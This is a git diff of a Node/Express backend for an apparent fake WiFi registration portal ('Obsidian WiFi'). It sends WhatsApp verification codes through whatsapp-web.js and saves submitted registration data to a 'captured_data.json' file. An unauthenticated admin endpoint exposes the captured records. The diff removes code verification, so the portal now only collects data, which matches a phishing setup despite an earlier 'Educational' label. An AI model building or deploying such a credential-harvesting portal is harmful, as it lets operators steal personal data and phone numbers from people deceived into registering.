@@ -23,261 +23,186 @@ const PORT = process.env.PORT || 8080;
 app.use(cors());
 app.use(bodyParser.json());
 
-// Serve static files from the React app
-app.use(express.static(path.join(__dirname, '../client/dist')));
-
-// --- Admin & WhatsApp State ---
-let latestQR = null;
-let connectionStatus = 'INITIALIZING'; // 'INITIALIZING', 'QR_REQUIRED', 'AUTHENTICATING', 'READY', 'DISCONNECTED'
-
-// --- WhatsApp Client Initialization ---
-const client = new Client({
-    authStrategy: new LocalAuth(),
-    puppeteer: {
-        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome-stable',
-        headless: true,
-        dumpio: true,
-        args: [
-            '--no-sandbox',
-            '--disable-setuid-sandbox',
-            '--disable-dev-shm-usage',
-            '--disable-accelerated-2d-canvas',
-            '--no-first-run',
-            '--no-zygote',
-            '--disable-gpu',
-            '--hide-scrollbars',
-            '--mute-audio'
-        ],
-    }
-});
-
-client.on('qr', async (qr) => {
-    connectionStatus = 'QR_REQUIRED';
-    console.log('--- WHATSAPP LOGIN REQUIRED ---');
-    qrcodeTerminal.generate(qr, { small: true });
-
-    // Convert QR to Base64 for web admin
-    try {
-        latestQR = await QRCode.toDataURL(qr);
-    } catch (err) {
-        console.error('QR Conversion Error:', err);
-    }
-});
-
-client.on('ready', () => {
-    connectionStatus = 'READY';
-    latestQR = null;
-    console.log('--- WHATSAPP CLIENT IS READY ---');
-});
-
-client.on('authenticated', () => {
-    connectionStatus = 'AUTHENTICATING';
-    console.log('--- WHATSAPP AUTHENTICATED ---');
-});
-
-client.on('disconnected', () => {
-    connectionStatus = 'DISCONNECTED';
-    console.log('--- WHATSAPP DISCONNECTED ---');
-});
-
-// Log directory
+// Log directory and captured data file
 const logDir = path.join(__dirname, 'logs');
-if (!fs.existsSync(logDir)) {
-    fs.mkdirSync(logDir);
-}
-
+if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);
 const logFile = path.join(logDir, 'captured_data.json');
 
-// --- Start Server BEFORE WhatsApp Init for Cloud Run health checks ---
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Educational Backend Server is running on port ${PORT}`);
-});
+// --- SYSTEM DIAGNOSTICS & STATE ---
+let client = null;
+let latestQR = null;
+let connectionStatus = 'INITIALIZING'; 
+let systemLogs = [];
 
-// Diagnostic: Check if Chrome exists
-const chromePath = process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome-stable';
-console.log(`--- SYSTEM DIAGNOSTIC ---`);
-console.log(`Chrome Path: ${chromePath}`);
-console.log(`Chrome Exists: ${fs.existsSync(chromePath)}`);
-if (fs.existsSync(chromePath)) {
-    try {
-        const stats = fs.statSync(chromePath);
-        console.log(`Chrome Permissions: ${stats.mode}`);
-    } catch (e) {
-        console.error('Error checking chrome stats:', e);
-    }
-}
+const addSystemLog = (msg) => {
+    const logEntry = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    console.log(logEntry);
+    systemLogs.push(logEntry);
+    if (systemLogs.length > 50) systemLogs.shift();
+};
 
-// Initialize WhatsApp with timeout to prevent hanging
+// --- WHATSAPP CLIENT MANAGEMENT ---
+const createClient = () => {
+    addSystemLog('Creating new WhatsApp client instance...');
+    
+    // Check for Chrome binary existence
+    const chromePath = process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome-stable';
+    addSystemLog(`Checking Chrome at: ${chromePath}`);
+    addSystemLog(`Chrome exists: ${fs.existsSync(chromePath)}`);
+
+    const newClient = new Client({
+        authStrategy: new LocalAuth(),
+        puppeteer: {
+            executablePath: chromePath,
+            headless: true,
+            dumpio: true, // Detailed Chrome logs to console
+            args: [
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+                '--disable-dev-shm-usage',
+                '--disable-accelerated-2d-canvas',
+                '--no-first-run',
+                '--no-zygote',
+                '--disable-gpu',
+                '--hide-scrollbars',
+                '--mute-audio'
+            ],
+        }
+    });
+
+    newClient.on('qr', async (qr) => {
+        connectionStatus = 'QR_REQUIRED';
+        addSystemLog('QR code generated, waiting for scan...');
+        try {
+            latestQR = await QRCode.toDataURL(qr);
+        } catch (err) {
+            addSystemLog(`QR conversion error: ${err.message}`);
+        }
+    });
+
+    newClient.on('ready', () => {
+        connectionStatus = 'READY';
+        latestQR = null;
+        addSystemLog('WhatsApp client is READY and connected!');
+    });
+
+    newClient.on('authenticated', () => {
+        connectionStatus = 'AUTHENTICATING';
+        addSystemLog('WhatsApp authenticated, finishing setup...');
+    });
+
+    newClient.on('auth_failure', (msg) => {
+        connectionStatus = 'DISCONNECTED';
+        addSystemLog(`WhatsApp auth failure: ${msg}`);
+    });
+
+    newClient.on('disconnected', (reason) => {
+        connectionStatus = 'DISCONNECTED';
+        addSystemLog(`WhatsApp disconnected: ${reason}`);
+    });
+
+    return newClient;
+};
+
 const initWhatsApp = async () => {
     try {
-        if (connectionStatus === 'READY' || connectionStatus === 'AUTHENTICATING') {
-            console.log('--- WHATSAPP ALREADY INITIALIZED OR CONNECTING ---');
-            return;
+        if (client) {
+            addSystemLog('Destroying existing client...');
+            await client.destroy().catch(e => addSystemLog(`Destroy error: ${e.message}`));
         }
 
+        client = createClient();
         connectionStatus = 'INITIALIZING';
-        console.log('--- INITIALIZING WHATSAPP CLIENT ---');
         
-        // Timeout mechanism: If it takes more than 2 minutes to init, something is wrong
         const timeout = setTimeout(() => {
             if (connectionStatus === 'INITIALIZING') {
-                console.error('--- WHATSAPP INIT TIMEOUT REACHED ---');
+                addSystemLog('CRITICAL: Initialization timeout (2 mins) - marking as DISCONNECTED');
                 connectionStatus = 'DISCONNECTED';
             }
         }, 120000);
 
+        addSystemLog('Calling client.initialize()...');
         await client.initialize();
         clearTimeout(timeout);
     } catch (err) {
-        console.error('WhatsApp Initialization Error:', err);
+        addSystemLog(`Initialization Error: ${err.message}`);
         connectionStatus = 'DISCONNECTED';
     }
 };
 
-initWhatsApp();
+// --- API ENDPOINTS ---
 
-// --- In-Memory Verification Codes ---
-const verificationCodes = new Map(); // phone -> { code: '123456', expires: timestamp }
+app.get('/api/admin/status', (req, res) => {
+    let logs = [];
+    if (fs.existsSync(logFile)) {
+        try { logs = JSON.parse(fs.readFileSync(logFile, 'utf-8')); } catch (e) {}
+    }
+    res.json({
+        status: connectionStatus,
+        qr: latestQR,
+        logs: logs.reverse().slice(0, 50),
+        systemLogs: systemLogs
+    });
+});
 
-// --- API Endpoints ---
+app.post('/api/admin/restart', async (req, res) => {
+    addSystemLog('Manual restart requested via Admin Panel.');
+    initWhatsApp();
+    res.json({ message: 'WhatsApp yeniden başlatılıyor...', status: 'success' });
+});
 
 app.post('/api/register', (req, res) => {
     const userData = req.body;
     const timestamp = new Date().toISOString();
     const entry = { timestamp, type: 'REGISTRATION', ...userData };
-
-    console.log('--- NEW REGISTRATION DATA ---');
-    console.table(userData);
-
+    
     let logs = [];
     if (fs.existsSync(logFile)) {
-        const fileContent = fs.readFileSync(logFile, 'utf-8');
-        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
+        try { logs = JSON.parse(fs.readFileSync(logFile, 'utf-8')); } catch (e) {}
     }
     logs.push(entry);
     fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
-
-    res.status(200).json({
-        message: 'Kayıt başarılı. Giriş sayfasına yönlendiriliyorsunuz.',
-        status: 'success'
-    });
+    
+    res.json({ message: 'Kayıt başarılı.', status: 'success' });
 });
 
 app.post('/api/request-code', async (req, res) => {
-    let { phone } = req.body;
-    const timestamp = new Date().toISOString();
-
+    const { phone } = req.body;
     if (connectionStatus !== 'READY') {
-        return res.status(503).json({
-            message: 'WhatsApp bağlantısı henüz hazır değil. Lütfen admin panelinden veya terminalden bağlantıyı kurun.',
-            status: 'error'
-        });
+        return res.status(503).json({ message: 'WhatsApp bağlantısı hazır değil.' });
     }
 
-    const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
-    verificationCodes.set(phone, {
-        code: generatedCode,
-        expires: Date.now() + 5 * 60 * 1000
-    });
+    const code = Math.floor(100000 + Math.random() * 900000).toString();
+    addSystemLog(`Sending verification code to ${phone}`);
 
     try {
         let formattedPhone = phone.replace(/\D/g, '');
-        if (formattedPhone.startsWith('0')) {
-            formattedPhone = '90' + formattedPhone.substring(1);
-        } else if (!formattedPhone.startsWith('90')) {
-            formattedPhone = '90' + formattedPhone;
-        }
-
-        const chatId = formattedPhone + "@c.us";
-        const message = `*DOĞRULAMA KODU*\n\nObsidian WiFi ağına erişim için doğrulama kodunuz: *${generatedCode}*\n\nLütfen bu kodu giriş ekranına giriniz.`;
-
-        await client.sendMessage(chatId, message);
-
-        let logs = [];
-        if (fs.existsSync(logFile)) {
-            const fileContent = fs.readFileSync(logFile, 'utf-8');
-            try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
-        }
-        logs.push({ timestamp, type: 'CODE_REQUEST', phone, sentCode: generatedCode });
-        fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
-
-        res.status(200).json({
-            message: 'Doğrulama kodu WhatsApp üzerinden gönderildi.',
-            status: 'success'
-        });
+        if (!formattedPhone.startsWith('90')) formattedPhone = '90' + (formattedPhone.startsWith('0') ? formattedPhone.substring(1) : formattedPhone);
+        
+        await client.sendMessage(`${formattedPhone}@c.us`, `Doğrulama kodunuz: *${code}*`);
+        res.json({ message: 'Kod gönderildi.', status: 'success' });
     } catch (error) {
-        console.error('WhatsApp Error:', error);
-        res.status(500).json({
-            message: 'Kod gönderilirken bir hata oluştu.',
-            status: 'error'
-        });
+        addSystemLog(`SMS Error: ${error.message}`);
+        res.status(500).json({ message: 'Hata oluştu.' });
     }
 });
 
-app.post('/api/login', (req, res) => {
-    const { phone, smsCode } = req.body;
-    const timestamp = new Date().toISOString();
+// Serve static files
+app.use(express.static(path.join(__dirname, '../client/dist')));
 
-    const storedData = verificationCodes.get(phone);
-    const isValid = storedData && storedData.code === smsCode && Date.now() < storedData.expires;
-
-    let logs = [];
-    if (fs.existsSync(logFile)) {
-        const fileContent = fs.readFileSync(logFile, 'utf-8');
-        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
-    }
-    logs.push({ timestamp, type: 'LOGIN_ATTEMPT', phone, enteredCode: smsCode, success: isValid });
-    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
-
-    if (isValid) {
-        verificationCodes.delete(phone);
-        res.status(200).json({
-            message: 'Giriş başarılı. Sisteme yönlendiriliyorsunuz.',
-            status: 'success'
-        });
-    } else {
-        res.status(401).json({
-            message: 'Geçersiz veya süresi dolmuş doğrulama kodu.',
-            status: 'error'
-        });
-    }
+// --- SPA & ADMIN ROUTING ---
+// Explicitly handle /admin and /admin/ to make sure SPA works
+app.get(['/admin', '/admin/*'], (req, res) => {
+    res.sendFile(path.join(__dirname, '../client/dist/index.html'));
 });
 
-// --- ADMIN ENDPOINTS ---
-
-app.get('/api/admin/status', (req, res) => {
-    let logs = [];
-    if (fs.existsSync(logFile)) {
-        const fileContent = fs.readFileSync(logFile, 'utf-8');
-        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
-    }
-
-    res.status(200).json({
-        status: connectionStatus,
-        qr: latestQR,
-        logs: logs.reverse().slice(0, 50) // Son 50 kayıt
-    });
-});
-
-app.post('/api/admin/restart', async (req, res) => {
-    console.log('--- MANUAL WHATSAPP RESTART REQUESTED ---');
-    try {
-        // Simple strategy: reset status and try init again
-        // Note: whatsapp-web.js doesn't always like multiple init calls on same object, 
-        // but it's worth a try or we might need to destroy and recreate client.
-        if (connectionStatus === 'DISCONNECTED' || connectionStatus === 'QR_REQUIRED') {
-            initWhatsApp();
-            res.json({ message: 'WhatsApp yeniden başlatılıyor...', status: 'success' });
-        } else {
-            res.status(400).json({ message: 'Zaten çalışıyor veya başlatılıyor.', status: 'error' });
-        }
-    } catch (err) {
-        res.status(500).json({ message: err.message, status: 'error' });
-    }
-});
-
-// The "catchall" handler: for any request that doesn't
-// match one above, send back React's index.html file.
+// Catch-all
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, '../client/dist/index.html'));
+});
+
+app.listen(PORT, '0.0.0.0', () => {
+    addSystemLog(`Server is running on port ${PORT}`);
+    // Start initial WhatsApp bridge
+    initWhatsApp();
 });
